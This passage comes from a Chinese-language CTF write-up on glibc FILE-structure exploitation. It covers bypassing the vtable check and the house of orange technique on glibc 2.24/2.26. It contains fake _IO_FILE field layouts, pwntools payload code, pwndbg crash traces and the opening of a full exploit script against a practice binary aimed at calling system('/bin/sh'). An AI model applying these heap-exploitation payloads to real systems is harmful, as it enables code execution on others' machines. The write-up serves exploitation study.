<span class="nf">_IO_wfile_sync</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">_IO_ssize_t</span> <span class="n">delta</span><span class="p">;</span>
  <span class="kt">wint_t</span> <span class="n">retval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="cm">/*    char* ptr = cur_ptr(); */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_do_flush</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
      <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
  <span class="n">delta</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">delta</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* We have to find out how many bytes we have to go back in the
	 external buffer.  */</span>
      <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">cv</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_codecvt</span><span class="p">;</span>    <span class="o">&lt;====</span> <span class="err">这里</span>
      <span class="n">_IO_off64_t</span> <span class="n">new_pos</span><span class="p">;</span>
</pre></table></code></div></div><p>等等等等，反正能用的肯定很多。</p><h3 id="总结">总结<a href="#总结" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>OK，现在知道了如何bypass vtable check，再稍微总结下对应各个function，file sturcture需要满足什么条件</p><ul><li><code class="language-plaintext highlighter-rouge">_IO_str_overflow</code></ul><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">_flags</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x7fffffffffffffff</span>
<span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="p">(</span><span class="n">bin_sh_addr</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span>
    
<span class="o">&amp;</span><span class="n">fp</span> <span class="o">+</span> <span class="mh">0xe0</span> <span class="o">=</span> <span class="n">system</span> 
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">_IO_str_finish</code></ul><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">_flags</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="n">bin_sh_addr</span>
    
<span class="o">&amp;</span><span class="n">fp</span> <span class="o">+</span> <span class="mh">0xe8</span> <span class="o">=</span> <span class="n">system</span>
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">_IO_wstr_finish</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>_wide_data-&gt;_IO_buf_base = bin_sh_addr  # 需要leak heap，稍微麻烦点
_flags2 = 0

&amp;fp + 0xe8 = system
</pre></table></code></div></div><p>当然，达成FSOP的条件不能忘记</p><ul><li><code class="language-plaintext highlighter-rouge">fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code><li><code class="language-plaintext highlighter-rouge">_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code></ul><blockquote><p>总结：不同方法，都是殊途同归，最终都是通过相对地址调用来call system(“/bin/sh”)</p></blockquote><h2 id="0x06-house-of-orange-glibc-224">0x06 house of orange (glibc 2.24)<a href="#0x06-house-of-orange-glibc-224" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>认真看完第五节的内容，了解如何bypass vtable check后，稍微改一下exp就可以完成glibc 2.24下house of orange的利用了</p><p>嗯，一定是这样的，没错。 NO！！还是遇到了一个大坑！</p><p>修改后的exp：</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">io_str_overflow_addr</span> <span class="o">-</span> <span class="mh">0x18</span>
<span class="n">p</span> <span class="o">=</span> <span class="s">'c'</span><span class="o">*</span><span class="mh">0x420</span> <span class="c1"># padding to unsorted bin chunk
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="c1"># fake file structure, to smallbin[4], _chain
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fd
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">io_list_all_addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># bk, unsorted bin attack
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_base
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">bin_sh_addr</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># _IO_write_ptr
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_end
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_buf_base
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">bin_sh_addr</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># _IO_buf_end
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x90</span> <span class="c1"># padding to vtable
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_vtable</span><span class="p">)</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</pre></table></code></div></div><p>实际运行结果：</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>Program received signal SIGSEGV, Segmentation fault.
_dl_debug_initialize <span class="o">(</span><span class="nv">ldbase</span><span class="o">=</span>ldbase@entry<span class="o">=</span>0, <span class="nv">ns</span><span class="o">=</span><span class="nt">-2</span><span class="o">)</span> at dl-debug.c:58
58      dl-debug.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────[ REGISTERS <span class="o">]</span>──────────────────────────────────────
<span class="k">*</span>RAX  0x7ffff7ffcf88 <span class="o">(</span>_DYNAMIC+280<span class="o">)</span> ◂— 0xa /<span class="k">*</span> <span class="s1">'\n'</span> <span class="k">*</span>/
 RBX  0x0
<span class="k">*</span>RCX  0x7fffffffd510 —▸ 0x7fffffffd620 ◂— 0x0
<span class="k">*</span>RDX  0x7ffff7ffd040 <span class="o">(</span>_rtld_global<span class="o">)</span> —▸ 0x7ffff7ffe168 —▸ 0x555555554000 ◂— jg     0x555555554047
 RDI  0x0
<span class="k">*</span>RSI  0xfffffffffffffffe
...
<span class="k">*</span>RSP  0x7fffffffd3d8 —▸ 0x7ffff7dec26b <span class="o">(</span>_dl_open+731<span class="o">)</span> ◂— mov    edx, dword ptr <span class="o">[</span>rax + 0x18]
<span class="k">*</span>RIP  0x7ffff7de8419 <span class="o">(</span>_dl_debug_initialize+105<span class="o">)</span> ◂— mov    dword ptr <span class="o">[</span>rax], 1
───────────────────────────────────────[ DISASM <span class="o">]</span>───────────────────────────────────────
 ► 0x7ffff7de8419 &lt;_dl_debug_initialize+105&gt;    mov    dword ptr <span class="o">[</span>rax], 1            &lt;_DYNAMIC+280&gt;
   0x7ffff7de841f &lt;_dl_debug_initialize+111&gt;    jne    _dl_debug_initialize+43                &lt;_dl_debug_initialize+43&gt;

   0x7ffff7de8421 &lt;_dl_debug_initialize+113&gt;    mov    rdx, qword ptr <span class="o">[</span>rip + 0x214bb8]
   0x7ffff7de8428 &lt;_dl_debug_initialize+120&gt;    mov    rdi, qword ptr <span class="o">[</span>rdx + 0x20]

pwndbg&gt; bt
<span class="c">#0  _dl_debug_initialize (ldbase=ldbase@entry=0, ns=-2) at dl-debug.c:58</span>
<span class="c">#1  0x00007ffff7dec26b in _dl_open (file=0x7ffff7b9a586 "libgcc_s.so.1", mode=&lt;optimized out&gt;, caller_dlopen=0x7ffff7b27851 &lt;__GI___backtrace+193&gt;, nsid=&lt;optimized out&gt;, argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;, env=0x7fffffffe168) at dl-open.c:688</span>
<span class="c">#2  0x00007ffff7b561fd in do_dlopen (ptr=ptr@entry=0x7fffffffd630) at dl-libc.c:87</span>
<span class="c">#3  0x00007ffff7de7874 in _dl_catch_error (objname=0x7fffffffd620, errstring=0x7fffffffd628, mallocedp=0x7fffffffd61f, operate=0x7ffff7b561c0 &lt;do_dlopen&gt;, args=0x7fffffffd630) at dl-error.c:187</span>
<span class="c">#4  0x00007ffff7b562b4 in dlerror_run (args=0x7fffffffd630, operate=0x7ffff7b561c0 &lt;do_dlopen&gt;) at dl-libc.c:46</span>
<span class="c">#5  __GI___libc_dlopen_mode (name=name@entry=0x7ffff7b9a586 "libgcc_s.so.1", mode=mode@entry=-2147483647) at dl-libc.c:163</span>
<span class="c">#6  0x00007ffff7b27851 in init () at ../sysdeps/x86_64/backtrace.c:52</span>
<span class="c">#7  __GI___backtrace (array=array@entry=0x7fffffffd690, size=size@entry=64) at ../sysdeps/x86_64/backtrace.c:105</span>
<span class="c">#8  0x00007ffff7a2fa76 in backtrace_and_maps (do_abort=&lt;optimized out&gt;, do_abort@entry=2, written=&lt;optimized out&gt;, fd=fd@entry=3) at ../sysdeps/unix/sysv/linux/libc_fatal.c:47</span>
<span class="c">#9  0x00007ffff7a8908b in __libc_message (do_abort=2, fmt=fmt@entry=0x7ffff7b9f000 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:172</span>
<span class="c">#10 0x00007ffff7a94ace in malloc_printerr (ar_ptr=0x7ffff7dd1b00 &lt;main_arena&gt;, ptr=0x7ffff7dd2500 &lt;_IO_list_all&gt;, str=0x7ffff7b9bc28 "malloc(): memory corruption", action=&lt;optimized out&gt;) at malloc.c:5048</span>
<span class="c">#11 _int_malloc (av=av@entry=0x7ffff7dd1b00 &lt;main_arena&gt;, bytes=bytes@entry=16) at malloc.c:3511</span>
</pre></table></code></div></div><p>诶，我人晕了，<code class="language-plaintext highlighter-rouge">__libc_message</code>后咋就进了<code class="language-plaintext highlighter-rouge"> backtrace_and_maps</code>然后一去不复返了，我的<code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code>呢？</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="n">libc_fatal</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">172</span>
<span class="nf">if</span> <span class="p">(</span><span class="n">do_abort</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">BEFORE_ABORT</span> <span class="p">(</span><span class="n">do_abort</span><span class="p">,</span> <span class="n">written</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>   <span class="o">&lt;====</span> <span class="err">这里有问题</span>

      <span class="cm">/* Kill the application.  */</span>
      <span class="n">abort</span> <span class="p">();</span>
    <span class="p">}</span>
<span class="err">没能走到</span><span class="n">abort</span><span class="p">()</span><span class="err">里</span>

 
<span class="err">会进入到这里</span><span class="n">dl</span><span class="o">-</span><span class="n">debug</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">58</span>
<span class="cm">/* Initialize _r_debug if it has not already been done.  The argument is
   the run-time load address of the dynamic linker, to be put in
   _r_debug.r_ldbase.  Returns the address of _r_debug.  */</span>

<span class="k">struct</span> <span class="n">r_debug</span> <span class="o">*</span>
<span class="n">internal_function</span>
<span class="nf">_dl_debug_initialize</span> <span class="p">(</span><span class="n">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="n">ldbase</span><span class="p">,</span> <span class="n">Lmid_t</span> <span class="n">ns</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">r_debug</span> <span class="o">*</span><span class="n">r</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">ns</span> <span class="o">==</span> <span class="n">LM_ID_BASE</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_r_debug</span><span class="p">;</span>
  <span class="k">else</span>
    <span class="n">r</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">GL</span><span class="p">(</span><span class="n">dl_ns</span><span class="p">)[</span><span class="n">ns</span><span class="p">].</span><span class="n">_ns_debug</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">r_map</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">ldbase</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Tell the debugger where to find the map of loaded objects.  */</span>
      <span class="n">r</span><span class="o">-&gt;</span><span class="n">r_version</span> <span class="o">=</span> <span class="mi">1</span>  <span class="cm">/* R_DEBUG_VERSION XXX */</span><span class="p">;</span>
      <span class="n">r</span><span class="o">-&gt;</span><span class="n">r_ldbase</span> <span class="o">=</span> <span class="n">ldbase</span> <span class="o">?:</span> <span class="n">_r_debug</span><span class="p">.</span><span class="n">r_ldbase</span><span class="p">;</span>
      <span class="n">r</span><span class="o">-&gt;</span><span class="n">r_map</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">GL</span><span class="p">(</span><span class="n">dl_ns</span><span class="p">)[</span><span class="n">ns</span><span class="p">].</span><span class="n">_ns_loaded</span><span class="p">;</span>
      <span class="n">r</span><span class="o">-&gt;</span><span class="n">r_brk</span> <span class="o">=</span> <span class="p">(</span><span class="n">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">))</span> <span class="o">&amp;</span><span class="n">_dl_debug_state</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
<span class="p">}</span>

<span class="err">看了下</span><span class="n">ldbase</span><span class="err">是</span><span class="mi">0</span><span class="err">啥的，可能是</span><span class="n">LD</span><span class="err">的问题</span>
</pre></table></code></div></div><p>于是试了下glibc all in one里所有的2.24版本，都不行：</p><ul><li>2.24-3ubuntu1_amd64<li>2.24-3ubuntu2.2_amd64<li>2.24-9ubuntu2.2_amd64<li>2.24-9ubuntu2_amd64</ul><p>emmm，换到2.26就可以了</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>❯ ldd houseoforange2.24
        linux-vdso.so.1 <span class="o">(</span>0x00007ffff7ffb000<span class="o">)</span>
        /home/sirius/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/libc-2.26.so <span class="o">(</span>0x00007ffff77e1000<span class="o">)</span>
        /home/sirius/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/ld-2.26.so <span class="o">=&gt;</span> /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007ffff7dd3000<span class="o">)</span>
</pre></table></code></div></div><p>poc:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">p</span> <span class="o">=</span> <span class="s">'c'</span><span class="o">*</span><span class="mh">0x420</span> <span class="c1"># padding to unsorted bin chunk
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="c1"># fake file structure, to smallbin[4], _chain
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fd
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">io_list_all_addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># bk, unsorted bin attack
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_base
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7fffffffffffffff</span><span class="p">)</span> <span class="c1"># _IO_write_ptr
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_write_end
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># _IO_buf_base
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">bin_sh_addr</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># _IO_buf_end
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x90</span> <span class="c1"># padding to vtable
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_vtable</span><span class="p">)</span>
<span class="n">p</span> <span class="o">+=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x20</span>
<span class="c1"># p += p64(system_addr)
</span></pre></table></code></div></div><p>运行结果，成功控制RIP</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7a7c7c1 <span class="k">in </span>__GI__IO_str_overflow <span class="o">(</span><span class="nv">fp</span><span class="o">=</span>0x555555766750, <span class="nv">c</span><span class="o">=</span><span class="nt">-1</span><span class="o">)</span> at strops.c:107
107     strops.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────[ REGISTERS <span class="o">]</span>──────────────────────────────────────
<span class="k">*</span>RAX  0x3ffffbdcc75f
<span class="k">*</span>RBX  0x555555766750 ◂— 0x0
<span class="k">*</span>RCX  0x0
<span class="k">*</span>RDX  0x7fffffffffffffff
<span class="k">*</span>RDI  0x7ffff7b98f20 ◂— 0x68732f6e69622f /<span class="k">*</span> <span class="s1">'/bin/sh'</span> <span class="k">*</span>/
<span class="k">*</span>RSI  0x7fffffffffffffff
...
<span class="k">*</span>RBP  0xffffffff
<span class="k">*</span>RSP  0x7fffffffda70 —▸ 0x7ffff7ffe6f0 —▸ 0x7ffff7ffb000 ◂— jg     0x7ffff7ffb047
<span class="k">*</span>RIP  0x7ffff7a7c7c1 <span class="o">(</span>_IO_str_overflow+129<span class="o">)</span> ◂— call   qword ptr <span class="o">[</span>rbx + 0xe0]
───────────────────────────────────────[ DISASM <span class="o">]</span>───────────────────────────────────────
 ► 0x7ffff7a7c7c1 &lt;_IO_str_overflow+129&gt;    call   qword ptr <span class="o">[</span>rbx + 0xe0]        &lt;0x6161616161616161&gt;

   0x7ffff7a7c7c7 &lt;_IO_str_overflow+135&gt;    <span class="nb">test   </span>rax, rax
   0x7ffff7a7c7ca &lt;_IO_str_overflow+138&gt;    mov    r13, rax
   0x7ffff7a7c7cd &lt;_IO_str_overflow+141&gt;    je     _IO_str_overflow+400                &lt;_IO_str_overflow+400&gt;
</pre></table></code></div></div><p>程序：<a href="/assets/file/houseoforange2.26">house of orange 2.26</a>, <a href="/assets/file/libc2.26.so">libc</a>, <a href="/assets/file/ld-2.26.so">ld</a></p><p>写了好几个利用方法，完整的EXP：</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# house of orange, exp for glibc 2.24
</span>
<span class="kn">from</span> <span class="nn">platform</span> <span class="kn">import</span> <span class="n">system</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'split'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./houseoforange2.24"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/home/sirius/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/libc-2.26.so'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">build</span><span class="p">(</span><span class="n">name_length</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">price</span><span class="o">=</span><span class="mi">12</span><span class="p">,</span> <span class="n">color</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Length of name :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">name_length</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Name :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Price of Orange:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Color of Orange:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">color</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">name_length</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">price</span><span class="o">=</span><span class="mi">12</span><span class="p">,</span> <span class="n">color</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Length of name :"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">name_length</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Name:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Price of Orange:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Color of Orange:"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">color</span><span class="p">))</span>

<span class="n">build</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="s">'a'</span><span class="p">)</span>
